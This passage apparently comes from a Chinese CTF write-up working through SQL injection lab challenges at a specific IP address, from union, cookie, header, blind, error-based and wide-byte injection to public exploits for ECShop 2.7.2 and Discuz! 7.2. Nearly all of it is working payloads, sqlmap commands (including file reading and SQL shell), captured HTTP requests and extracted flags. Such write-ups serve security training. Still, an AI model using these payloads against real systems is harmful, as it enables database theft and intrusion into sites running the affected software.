&quot;),&#123;num&#125;,1)=&#x27;&#123;estimate&#125;&#x27;)&quot;, length=riddle_length)\n\n\nsqlmap利用\n# 注！！！注！！！注！！！# sqlmap一把梭时，可在存在伪静态注入点后加入 * 符号标识，具体如下# 爆当前使用的库名sqlmap -u &quot;http://47.103.94.191:8001/front/articles-1*.html&quot; --batch  –-current-db# 爆news库下表名sqlmap -u &quot;http://47.103.94.191:8001/front/articles-1*.html&quot; --batch -D &quot;news&quot; --tables# 爆news库flag_is_here表下字段名sqlmap -u &quot;http://47.103.94.191:8001/front/articles-1*.html&quot; --batch -D &quot;news&quot; -T &#x27;flag_is_here&#x27; --columns# 爆news库flag_is_here表fid和flag_number字段内容sqlmap -u &quot;http://47.103.94.191:8001/front/articles-1*.html&quot; --batch -D &quot;news&quot; -T &#x27;flag_is_here&#x27; -C &#x27;fid,flag_number&#x27; --dump# 最终得到flag&#123;c681ed59dd48ac30bfe913a4c73b2aaa&#125; # 注：使用 -v 参数设置sqlmap的回显等级， -v 为 3 时恰好显示注入语句sqlmap -u &quot;http://47.103.94.191:8001/front/articles-1*.html&quot; --batch -v 3\n\n\n\n0x02 SQL搜索型注入010o00 题目提示SQL搜索型注入01漏洞URL:http://47.103.94.191:8002/search.php提示:flag在数据库里\n\n0o01 利用过程\n直接搜索框测试，注入点无法查看，使用 HackBar 获取post内容。\n\n显而易见的注入点，现在构造你的语句吧① 传递查询参数1时，通过POST传参 search=1 ，查询数据库中某字段中（返回到前端的Message列）含1的内容，猜测SQL语句类似select column1,column2,column3 from table where like &#39;%$&#123;parameter&#125;%&#39;。② 通过修改search=1&#39; order by 5#中的5判断注入语句中的字段个数，此处为5。③ 通过构造union子句检测查询内容回显在前端的哪个位置search 1&#39; union select 1,2,3,4,5#。\nsearch=1&#x27; union select 1,2,group_concat(distinct table_name),4,5  from information_schema.columns where table_schema like database()%23得到：\taccount,caffaine,dwvs_admin_message,dwvs_message,dwvs_user_message,dwvs_vulnerability,flag,news,usersearch=1&#x27; union select 1,2,group_concat(distinct column_name),4,5 from information_schema.columns where table_name like &#x27;flag&#x27;%23得到：\tid,flagsearch=1&#x27; union select 1,2,group_concat(distinct flag),4,5  from flag%23得到：flag&#123;8bce2844bc098845261fad79a3a56215&#125;\n\n\nsqlmap测试\n# 通过 --data 参数指定提交的post数据sqlmap -u &quot;http://47.103.94.191:8002/search.php&quot; --batch --data &quot;search=1&quot; -D &#x27;dwvs&#x27; -T &#x27;flag&#x27; -C &#x27;id,flag&#x27; --dump# 通过 -r 参数指定post请求包sqlmap -r ./post.txt -D &#x27;dwvs&#x27; -T &#x27;flag&#x27; -C &#x27;flag&#x27; --dump\nPOST /search.php HTTP/1.1Host: 47.103.94.191:8002Content-Length: 8Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://47.103.94.191:8002Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.103.94.191:8002/search.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: security_level=1; PHPSESSID=2ge1634i8bqs8o9g1nsebvsvk2Connection: closesearch=1\n\n0x03 Cookie注入0o00 题目提示Cookie注入题目URL：http://47.103.94.191:8009提示：flag在数据库里面.\n\n0o01 Cookie注入\n原理：在动态脚本语言中存在超全局变量可以获取多种传参方式，如php中的 $_REQUEST[] 可以获取 POST|GET|COOKIE ，但php 5.4 以上版本不再接受Cookie传参。故，在发送请求包时，可以在请求头中添加&#x2F;更改Cookie值以构造非法语句来实现注入。简而言之，修改本地Cookie值来提交非法请求。\n使用：①通过bp抓包后添加&#x2F;修改请求头Cookie值；②通过控制台执行document.cookie=&quot;id=&quot;+escape(&quot;3&quot;)添加&#x2F;修改请求头Cookie值；③通过Cookie Editor插件添加&#x2F;修改请求头Cookie值；④通过sqlmap工具指定--cookie参数以及指定探测等级--level为2级及以上。\n时机：站点对$_GET和$_POST提交的数据进行过滤，但未对$_COOKIE提交的数据进行过滤时。\n\n0o02 利用过程\n将请求包中，Cookie值（没有就自己加）替换为GET请求的URL中?后面部分，即id=2。同时，删掉URL中?及其后面部分（截至到空格）。\n\nbp利用语句（和上一题一样猜想测试）\nCookie: id=-2 union select 1,database(),version(),group_concat(distinct table_name),5 from information_schema.columns where table_schema like database()得到：account,sql_admin_message,sql_message,sql_user_message,sql_vulnerability,this_flag,user,usersCookie: id=-2 union select 1,database(),version(),group_concat(distinct column_name),5 from information_schema.columns where table_name like &#x27;this_flag&#x27;得到：id,flag得到：flag&#123;d523990a3ff51ff035d5cf378f175e88&#125;,dagebiedawo\n\n\nF12–&gt;Console–&gt;使用document.cookie=&quot;id=&quot;+escape(&quot;3&quot;)语句修改本地保存的Cookie值后再对http://47.103.94.191:8009/user.php发起请求。\ndocument.cookie=&quot;id=&quot;+escape(&quot;3&quot;)document.cookie：表示当前浏览器中的cookie变量escape()：该函数用于对字符串进行编码\n\n\n使用Cookie Editor插件添加&#x2F;修改本地Cookie内容，更加方便！！！\n\nsqlmap使用\n# 需要指定 --level 提高探测等级（等级2以上才会检测cookie注入），以使用更多 payload 注入sqlmap -u &#x27;http://47.103.94.191:8009/user.php?id=2&#x27; --batc --cookie &quot;id=2&quot; --dbs --level 2 # 通过 -r 参数指定post请求包，但一样要指定Cookie值，就更麻烦sqlmap -r post.txt --batch --cookie &quot;id=2&quot; -D &#x27;cookie&#x27; --tables --level 2\nGET /user.php HTTP/1.1Host: 47.103.94.191:8009Pragma: no-cacheCache-Control: no-cacheUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie:id=2Connection: close\n\n0x04 X-Forwarded-For注入0o00 题目提示X-Forwarded-For注入题目URL：http://47.103.94.191:8010/提示：flag在数据库里面.\n\n0o01 X-Forwarded-For注入\n名词解析：X-Forwarded-For（XFF）是用来识别通过HTTP代理或负载均衡方式连接到Web服务器的客户端最原始的IP地址的HTTP请求头字段。 Squid 缓存代理服务器的开发人员最早引入了这一HTTP头字段，并由IETF在HTTP头字段标准化草案中正式提出。\n名词相关：XFF的有效使用是在保证代理服务器可信的前提下，如通过创建可信服务器白名单等。假设没有XFF等技术，则通过代理服务器的连接显示的是代理服务器的IP，而非连接发起的原始IP。即，代理服务器充当匿名服务提供者，使得连接的原始地址不可知。进而，服务对接时对恶意访问的检测和预防难度将大大增加。\nXFF格式：X-Forwarded-For: client1, proxy1, proxy2, proxy3\n\n0o02 利用过程\nbp工具利用\nGET /whitelist.php HTTP/1.1Host: 47.103.94.191:8010Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6X-Forwarded-for:&#x27;union select 1,2,3,4,5&#x27;Connection: close\n// 得到哪个字段回显前端--&gt;2,3X-Forwarded-for:&#x27;union select 1,2,3,4,5&#x27;    // 得到数据库名--&gt;xffX-Forwarded-for:&#x27;union select 1,database(),3,4,5&#x27;    // 得到表名--&gt;this_flagX-Forwarded-for:&#x27;union select 1,database(),(select group_concat(table_name) from information_schema.columns where table_schema = database()),4,5&#x27;    // 得到字段名--&gt;flagX-Forwarded-for:&#x27;union select 1,database(),(select group_concat(column_name) from information_schema.columns where table_schema = database()),4,5&#x27;// 得到字段内容--&gt;flag&#123;00b116d12ab1d53490e6b685cc7862fc&#125;X-Forwarded-for:&#x27;union select 1,database(),(select flag from this_flag limit 1),4,5&#x27;\n\n\nsqlmap利用\n// 按官方文档说，-H 是添加额外的请求头字段；-p 指定注入参数呗sqlmap -u &quot;http://47.103.94.191:8010/whitelist.php&quot; --batch -H &quot;X-Forwarded-For:127.0.0.1&quot; -p &quot;X-Forwarded-For&quot; -D &quot;xff&quot; -T &quot;this_flag&quot; -C &quot;flag&quot; --dump// 也可以直接拿bp抓取到的请求包进行 sqlmap 注入，同样要 -p 指定参数，具体看上面的注入步骤吧\n\n\n\n0x05 POST盲注&amp;万能密码0o00 题目提示POST盲注&amp;万能密码 (200分)漏洞1）form表单盲注&amp;万能密码登陆框：http://47.103.94.191:8003/user/login.php漏洞URL：http://47.103.94.191:8003/user/logCheck.php漏洞2）需要登陆抓包漏洞页面：http://47.103.94.191:8003/user/edit.php漏洞URL：http://47.103.94.191:8003/user/updateName.php提示:flag在数据库里\n\n0o01 漏洞1\n别被万能密码误导，在登录框那使用万能密码登录，而实际需要的是抓取登录请求的包，以user和pass参数作为注入点。\n\n\n\n测试一波，就发现返回Mysql Error!!或账密不正确，so……尝试盲注注入——时间盲注\nPOST /user/logCheck.php HTTP/1.1Host: 47.103.94.191:8003Content-Length: 37Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://47.103.94.191:8003Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20120101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.103.94.191:8003/user/login.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: PHPSESSID=vthao53sebdao4cbvqd2bt5ji2Connection: closeuser=admin&amp;pass=admin&#x27;&amp;submit=submit\n\n\nbp利用\n\n\n// ddd为临时表，使用两个and关键字进行联合查询user=admin&amp;pass=&#x27; and (select 1 from (select(sleep(5))) as ddd) and &#x27;1&#x27;=&#x27;1&amp;submit=submit// 改用使用 “#”注释符user=admin&amp;pass=&#x27; and (select 1 from (select(sleep(5))) as ddd)#&amp;submit=submit// 判表名长度user=admin&amp;pass=admin&#x27; and if(length(database())=5,1,sleep(5))#&amp;submit=submit// 时间盲注时，使用 Burp 的 Intruder 模块需要设置单线程；方便以响应时间作为猜想成功的依据；// 同时，查看爆破结果时需要在 columns 选项中勾选Response received或Response completed 查看响应时间user=admin&amp;pass=admin&#x27; and if(substr(database(),§1§,1)=&#x27;§d§&#x27;,sleep(5),null) and &#x27;1&#x27;=&#x27;1&amp;submit=submit// 之后步骤类似，不多做解释\n\n\nsqlmap利用\n\n// --form 参数自动获取请求页中的form表单测试sqlmap -u &quot;http://47.103.94.191:8003/user/login.php&quot; --batch --random-agent --forms// 得到库名--&gt;dwvssqlmap -u &quot;http://47.103.94.191:8003/user/login.php&quot; --batch --random-agent --forms --dbs// 得到表名--&gt;flagsqlmap -u &quot;http://47.103.94.191:8003/user/login.php&quot; --batch --random-agent --forms -D dwvs --tables// 得到字段名--&gt;flagsqlmap -u &quot;http://47.103.94.191:8003/user/login.php&quot; --batch --random-agent --forms -D dwvs -T flag --columns// 字段内容--&gt;flag&#123;f99c688f101bb53fdbf178ad0889182e&#125;sqlmap -u &quot;http://47.103.94.191:8003/user/login.php&quot; --batch --random-agent --forms -D dwvs -T flag -C flag --dump\n\n0o02 漏洞2\n试了几波万能密码，&#39;or &#39;1&#39;=&#39;1&#x2F;pwd存在数据库或admin&#39;#&#x2F;任意字符，具体语句：SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&#39;&#39;or &#39;1&#39;=&#39;1&#39; AND DWVS_user_passwd=&#39;&#39;;根据mysql中and的优先级高于or可知，&#39;or &#39;1&#39;=&#39;1与DWVS_user_passwd=&#39;&#39;;先做and运算找到密码正确的记录，之后做or运算判断DWVS_user_name字段，此时账号存在抑或正确与否已无任何关系，仅需密码存在即可；或SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&#39;admin&#39;# AND DWVS_user_passwd=&#39;&#39;;通过#注释 AND DWVS_user_passwd=&#39;&#39;;部分，使得密码无需填写，仅需账号存在即可。\n通过sqlmap -u &quot;http://47.103.94.191:8003/user/login.php&quot; --batch --random-agent --forms --sql-shell``SELECT COUNT(*) FROM dwvs_user_message;查询，记录数是45。写入 SELECT * FROM dwvs_user_message limit 5;，读取到前5条记录，可以看到有多个账户1，对应不同的密码，同时账户1可以多次创建，密码不同账户不同，其他账户名不行。同时，使用1&#39;#账号无法登录，未理解！！！\n查看源码文件：https://github.com/bugku/BWVS/blob/master/user/logCheck.php\n\n\nbp手工布尔盲注（更新用户名处抓包）：POST /user/updateName.php HTTP/1.1Host: 47.103.94.191:8003Content-Length: 32Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://47.103.94.191:8003Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.103.94.191:8003/user/edit.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: PHPSESSID=4s0hom06cjglakfi64fu9u0h21Connection: closeu_id=1&amp;user_name=1&amp;submit=submit\n// 请了解MySQL的case搜索函数（case when then else end，可代替where）// rlike 运算符（REGEXP 的同义词）执行字符串表达式与模式的模式匹配--正则表达式相关。// 举例：select 123 rlike 1。在 123 中含有 1 （模糊匹配）， 则整个 select 语句返回 1，反之返回 0。// 完整语句：UPDATE dwvs_user_message SET DWVS_user_name = &#x27;1&#x27; RLIKE (SELECT (CASE WHEN (3454=3454) THEN 1 ELSE 2 END))-- nLnq&#x27; WHERE DWVS_user_id = &#x27;1&#x27;;// 如下语句解析，CASE WHEN (3454=3454) THEN 1 ELSE 0x28 END) 中，由于 3454=3454 恒成立，则得到整个语句结果为 1；// &#x27;1&#x27; RLIKE 1 的结果为 1，则之后的 DWVS_user_name 都设置为 1，这也是为什么出现多个以 1 为名的账户的原因。// 注入原理：rlike遇到特殊字符&#x27;(&#x27;报错缺少右括号，char(40)为&#x27;(&#x27; ，0x28为&#x27;(&#x27;，则可通过修改“3454=3454”部分内容进行猜想。// 注：请理解正则表达式语法，rlike注入的实现大致是正则表达式的语法错误（仅个人理解）。u_id=1&amp;user_name=1&#x27; RLIKE (SELECT (CASE WHEN (3454=3454) THEN 1 ELSE 0x28 END))-- nLnq&amp;submit=submit// 猜想数据库长度，正确长度为4u_id=1&amp;user_name=1&#x27; RLIKE (SELECT (CASE WHEN (length(database())=3) THEN 1 ELSE 0x28 END))#&amp;submit=submit// 猜想具体字符u_id=1&amp;user_name=1&#x27; RLIKE (SELECT (CASE WHEN (if((substr(database(),2,1)=&#x27;W&#x27;),1,0)) THEN 1 ELSE 0x28 END))#&amp;submit=submit\n\n\n\n\nsqlmap注入// 指定注入参数 user_name，获得三种注入方式sqlmap -r test.txt --batch -p user_name// 指定使用布尔盲注获取当前数据库名--&gt;dwvssqlmap -r test.txt --batch -p user_name --technique B --current-db// ……// 拿flag--&gt;flag&#123;f99c688f101bb53fdbf178ad0889182e&#125;sqlmap -r test.txt --batch -p user_name --technique B -D dwvs -T flag -C flag --dump// 读取源码文件/var/www/html/user/updateName.phpsqlmap -r test.txt --batch -p user_name --technique B --file-read &quot;/var/www/html/user/updateName.php&quot; --threads 10\n&lt;?php  include_once(&#x27;../bwvs_config/sys_config.php&#x27;);if(isset($_POST[&#x27;submit&#x27;]) &amp;&amp; !empty($_POST[&#x27;user_name&#x27;])) &#123;  #       $clean_username = select_waf1($_POST[&#x27;user_name&#x27;]);  $clean_username = $_POST[&#x27;user_name&#x27;];  #       $clean_username = XSS_reg($clean_username);  $clean_user_id = clear_all($_POST[&#x27;u_id&#x27;]);  if(!is_numeric($clean_user_id))  &#123;    $_SESSION[&#x27;Uid_error&#x27;] = &#x27;非法的用户ID&#x27;;    header(&#x27;Location: edit.php&#x27;);  &#125;else&#123;    $sql = &quot;SELECT * FROM dwvs_user_message WHERE DWVS_user_name =&quot;.&quot;&#x27;&quot;.&quot;$clean_username&quot;.&quot;&#x27;&quot;;    $data = mysqli_query($connect, $sql) or die(mysqli_error($connect));    if(mysqli_num_rows($data) == 1)&#123;      $_SESSION[&#x27;update_error&#x27;] = &#x27;error&#x27;;      header(&#x27;Location: edit.php&#x27;);    &#125;else&#123;      $sql_Up = &quot;UPDATE dwvs_user_message SET DWVS_user_name = &#x27;$clean_username&#x27; WHERE DWVS_user_id = &#x27;$clean_user_id&#x27;&quot;;      mysqli_query($connect,$sql_Up) or die(mysqli_error($connect));      mysqli_close($connect);      $_SESSION[&#x27;user_name&#x27;] = $clean_username;      header(&#x27;Location: edit.php&#x27;);    &#125;  &#125;     &#125;else&#123;  not_find($_SERVER[&#x27;PHP_SELF&#x27;]);&#125;?&gt;\n\n\n0x06 SQL报错型注入0o00 题目提示SQL报错型注入需要注册登陆漏洞一：insert报错注入漏洞页面：http://47.103.94.191:8004/message.php漏洞URL：http://47.103.94.191:8004/messageSub.php漏洞二：update报错注入漏洞页面：http://47.103.94.191:8004/user/edit.php漏洞URL：http://47.103.94.191:8004/user/updateName.php提示：flag在数据库里面\n\n0o01  漏洞一：insert报错注入\n登录后留言界面留言并抓包，之后去重放那测试。抑或，那请求包去sqlmap那边跑，语句：sqlmap -r test.txt --batch 或 sqlmap -u &quot;http://47.103.94.191:8004/messageSub.php&quot; --batch --cookie &quot;PHPSESSID=4s0hom06cjglakfi64fu9u0h21&quot; --data &quot;message=libai&amp;submit=submit&quot;。\n注：别退出登录（cookie失效）！！！POST /messageSub.php HTTP/1.1Host: 47.103.94.191:8004Content-Length: 27Cache-Control: max-age=0Upgrade-Insecure-Requests: 1Origin: http://47.103.94.191:8004Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.64 Safari/537.36 Edg/101.0.1210.53Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Referer: http://47.103.94.191:8004/message.phpAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6Cookie: PHPSESSID=4s0hom06cjglakfi64fu9u0h21Connection: closemessage=libai&amp;submit=submit\n// 某个位置回显数据--&gt;仅闭合构造// 测试字段数message=1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;)#&amp;submit=submit// 测试回显位置message=1&#x27;,&#x27;2&#x27;,&#x27;3&#x27;,&#x27;5&#x27;)#&amp;submit=submit// 代替&#x27;3&#x27;,获取版本message=1&#x27;,&#x27;2&#x27;,@@version,&#x27;5&#x27;)#&amp;submit=submit// 报错注入// 使用 extractvalue() 方法构造报错注入，得到库名--&gt;dwvsmessage=222&#x27;or extractvalue(1,concat(0x7e,database(),0x7e)))#&amp;submit=submit// 或使用其他字符使 xml路径 不正确message=222&#x27;or extractvalue(1,concat(&#x27;///&#x27;,database())))#&amp;submit=submit// 得到表名--&gt;flagmessage=222&#x27;or extractvalue(1,concat(&#x27;///&#x27;,(select distinct(table_name) from information_schema.columns where table_schema=database() limit 6,1))))#&amp;submit=submit// 得到字段名--&gt;flagmessage=222&#x27;or extractvalue(1,concat(&#x27;///&#x27;,(select distinct(column_name) from information_schema.columns where table_name=&#x27;flag&#x27; limit 1,1))))#&amp;submit=submit// 得到flag--&gt;flag&#123;690997feb8fc9341&#125;message=222&#x27;or extractvalue(1,concat(&#x27;///&#x27;,(select distinct(flag) from flag limit 0,1),&#x27;///&#x27;)))#&amp;submit=submit\n\n\n0o02漏洞二：update报错注入// GeometryCollection是由1个或多个任意类几何对象构成的几何对象// GeometryCollection中的所有元素必须具有相同的空间参考系（即相同的坐标系）// 官方举例：GEOMETRYCOLLECTION(POINT(10 10), POINT(30 30), LINESTRING(15 15, 20 20))// POINT(x,y) 函数--&gt;坐标函数// LINESTRING(x y,x y)函数--&gt;描述直线，使两点连成直线// ！！！！使用条件：5.5&lt;mysql版本&lt;5.6// 注入原理：构造不符合绘制几何图形的参数实现注入，如写入参数为字符串// 直接拿flag--&gt;flag&#123;f99c688f101bb53fdbf178ad0889182e&#125;// 注：！！！需要构建2个临时表：a和b，三层select嵌套，暂不懂具体原理(大致是waf造成)。u_id=1&amp;user_name=1&#x27;and GeometryCollection((select * from(select * from (select flag from flag)a)b))#  #&amp;submit=submit\n\n0x07 宽字符注入0o00 题目提示宽字符注入题目URL：http://47.103.94.191:8011提示：flag在数据库里面.\n\n0o01 注入流程\nbp手注，具体内容请访问如下URL：\n\n// 回显提示：数据库没有id=-81，即不成立，则查找 1=1，为真，即id=1；之后，进行注释闭合// 回显内容：// The Query String is : SELECT * FROM users WHERE id=&#x27;-81�\\\\\\&#x27; or 1=1 -- -&#x27; LIMIT 0,1// hacker 工具利用，构造单引号逃逸http://47.103.94.191:8011/wide.php?id=-81�\\&#x27; or 1=1  -- -// 猜当前查询语句中查询的字段数--&gt;5http://47.103.94.191:8011/wide.php?id=1�\\&#x27; order by 5  -- -// 利用bp工具，注意编码GET /wide.php?id=1%df&#x27;or%201=1%20%23 HTTP/1.1// 获取flag--&gt;flag&#123;573ce050c8dcdf3f216bf1485480c1ff&#125;http://47.103.94.191:8011/wide.php?id=-1�\\&#x27; union select 1,2,3,flag ,5 from this_flag -- -\n\n\nsqlmap宽字节注入\n\n// 调用 sqlmap 的 unmagicquotes.py 脚本构造宽字符注入绕过waf// 使用说明：用一个多字节组合%bf%27和末尾通用注释一起替换空格// 转换输出：1&#x27; AND  1=1 ==》 1%bf%27 AND 1=1-- -// 调用 unmagicquotes.py 脚本后，可实现注入sqlmap -u &quot;http://47.103.94.191:8011/wide.php?id=3&quot; --batch --tamper unmagicquotes// 获取flag--&gt;flag&#123;573ce050c8dcdf3f216bf1485480c1ff&#125;sqlmap -u &quot;http://47.103.94.191:8011/wide.php?id=3&quot; --batch --tamper unmagicquotes -D kzf -T this_flag -C flag --dump\n0x08 宽字符注入020o00 题目提示宽字符注入02网站URL：http://47.103.94.191:8036/提示：flag在网站数据库里面\n\n0o01 ecshop gbk存在宽字符注入\n首页CMS信息ECSHOP v2.7.2 \n找找度娘，杂乱无章，跑去跑目录了，不知道是官方还是大佬写的：http://47.103.94.191:8036/readme.txt。\n漏洞信息：https://www.seebug.org/vuldb/ssvid-93503\n漏洞解析（不肯定）：https://www.2cto.com/Article/201301/182881.html\n\n0o02 注入流程\n这里想测试使用load_file()手工读取文件，奈何……弄不出，有懂得师傅滴滴~\n\n// 测试// 完整的sql语句：SELECT user_id FROM `ecshop`.`ecs_users` WHERE user_name=&#x27;xxx&#x27; http://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27;// 闭合http://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; and 1=1 -- -// 使用updatexml报错注入 --&gt; ecshophttp://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,database(),0x7e),0) -- -// 找 ecshop 库下表的个数 --&gt; 89http://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select count(distinct(table_name)) from information_schema.columns where table_schema=database()),0x7e),0) -- -// 找 ecshop 库中 flag 相关表（bp爆破模块） --&gt; ecs_flaghttp://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select distinct(table_name) from information_schema.columns where table_schema=database() limit 37,1),0x7e),0) -- -// 找 ecs_flag 表中 flag 相关字段 --&gt; id,flag// 报错：Unknown column &#x27;ecs_flag&#x27; in &#x27;where clause&#x27;// 16进制编码：ecs_flag --&gt; 0x6563735f666c6167http://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select distinct(column_name) from information_schema.columns where table_name=0x6563735f666c6167 limit 1,1),0x7e),0) -- -// 拿flag --&gt; flag&#123;e3c801b0662311754ded6f7469http://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select flag from ecshop.ecs_flag),0x7e),0) -- -// updatexml报错长度限制，substr() 方法进行截断拿后面部分flag --&gt; d6f746903a577&#125;http://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; or updatexml(1,concat(0x7e,(select substr(flag,25,30) from ecshop.ecs_flag),0x7e),0) -- -// flag 组合 --&gt; flag&#123;e3c801b0662311754ded6f746903a577&#125;// 网上流传的exphttp://47.103.94.191:8036/user.php?act=is_registered&amp;username=%df&#x27; and 1=1 union select 1 and (select 1 from(select count(*),concat((Select concat(0x5b,user,0x3a,password,0x5d) FROM mysql.user limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a) %23\n\n0x09 SQL报错型注入020o00 题目提示SQL报错型注入02题目URL：http://47.103.94.191:8042/\n\n0o01 Discuz! 7.2 SQL注入\nCMS呀，直接度娘搜，faq.php文件页面存在SQL注入。\n\n// PHP 指令 magic_quotes_gpc 为 on --&gt; 作用类似 addslashes()，即对输入的字符进行转义处理。// 注：如对输入数据进行 addslashes()处理，则输出时须用 stripslashes()去掉多余的反斜杠。// addslashes(string) --&gt; 返回在预定义字符之前添加反斜杠的字符串。// stripslashes(string) --&gt; 删除由 addslashes() 函数添加的反斜杠。\n\n\n此处不做演示（注：magic_quotes_gpc 自 PHP 5.3 已废弃，自PHP 5.4 已移除。）\n基础理解：在PHP中，若输入为字符串STR，却使用数组方式取值时，则PHP对STR进行单字符拆分，类似C语言的字符串数组。故，在转义后 $sql[0]&#x3D;’&#39;，$sql[1]&#x3D;’单引号’。\n\n# 1.php&lt;?php  $sql = $_GET[&#x27;sql&#x27;];echo $sql;exit;?&gt;\n# 2.php&lt;?php  $sql = $_GET[&#x27;sql&#x27;];echo $sql[0];exit;?&gt;\n\n\n深入理解：看大佬解析吧！！！①https://www.t00ls.com/articles-27175.html（大致是原版，不保证）②https://www.proyy.com/6995090823914209288.html③https://www.leavesongs.com/discuz72-sql-injection.html\n定义数组 $groupids，之后遍历$gids（$_GET[gids]），先将$gids的每个元素分别赋予$row，然后才是将$row的第一个元素$row[0]取出赋予$groupids[]数组进行存储。\n如下第一个代码块的11句，又调用了implodeids($array)方法，将$groupids数组以,分隔开，组成类似&#39;1&#39;,&#39;2&#39;,&#39;3&#39;,&#39;4&#39;的字符序列。根据前面说的，&#39;被转义称\\&#39;，取第一个元素为\\，则分隔后内容类似&#39;1&#39;,&#39;2&#39;,&#39;\\&#39;,&#39;4&#39;。即\\和它之后的&#39;构成转义字符\\&#39;，\\前的&#39;和4前的&#39;将闭合，其中内容构成新的一个字符串。故此，4后面的单引号逃逸，在4的位置构造注入将获得需要的数据。\n\n&#125; elseif($action == &#x27;grouppermission&#x27;) &#123;......\tksort($gids);\t$groupids = array();\tforeach($gids as $row) &#123;\t\t$groupids[] = $row[0];\t&#125;\t$query = $db-&gt;query(&quot;SELECT * FROM &#123;$tablepre&#125;usergroups u LEFT JOIN &#123;$tablepre&#125;admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (&quot;.implodeids($groupids).&quot;)&quot;);\nfunction implodeids($array) &#123;\tif(!empty($array)) &#123;\t\treturn &quot;&#x27;&quot;.implode(&quot;&#x27;,&#x27;&quot;, is_array($array) ? $array : array($array)).&quot;&#x27;&quot;;\t&#125; else &#123;\t\treturn &#x27;&#x27;;\t&#125;&#125;\n\nhttp://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;直接拼入&amp;gids[2]=&#39;&amp;gids[3]=3&amp;gids[4]=4，即http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;&amp;gids[3]=3&amp;gids[4]=4。得到sql语句 SELECT * FROM [Table]usergroups u LEFT JOIN [Table]admingroups a ON u.groupid=a.admingid WHERE u.groupid IN (&#39;7&#39;,&#39;\\&#39;,&#39;3&#39;,&#39;4&#39;)。得到 报错……for the right syntax to use near &#39;3&#39;,&#39;4&#39;)&#39; at line 1，即在\\&#39;的转义下，单引号不闭合，造成4后的单引号逃逸直接报错。\n\n对大佬得构造语句进行理解：两重select嵌套，保证内层select中floor报错执行，若实现得到有用信息，需要使用concat方法将注入语句与floor(rand(0)*2)进行组合，使报错时出现有用信息（仅个人理解，不保证正确）。\n\nhttp://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;&amp;gids[3][0]=) and (select 1 from (select floor(rand(0)*2) as x,count(*) from mysql.user group by x)y)%23\n\n最后构成的exp：http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[2]=&#39;&amp;gids[3][0]=) and (select 1 from (select concat(0x7e,database(),0x7e,floor(rand(0)*2)) as x,count(*) from mysql.user group by x)y)%23\n\n\n0o02 注入流程\n另一种exp利用\n\n// 拿库名http://47.103.94.191:8042/faq.php?action=grouppermission&amp;gids[t00ls]=%27&amp;gids[t00ls1][]=,(select 1 from(select count(*),concat((select (select 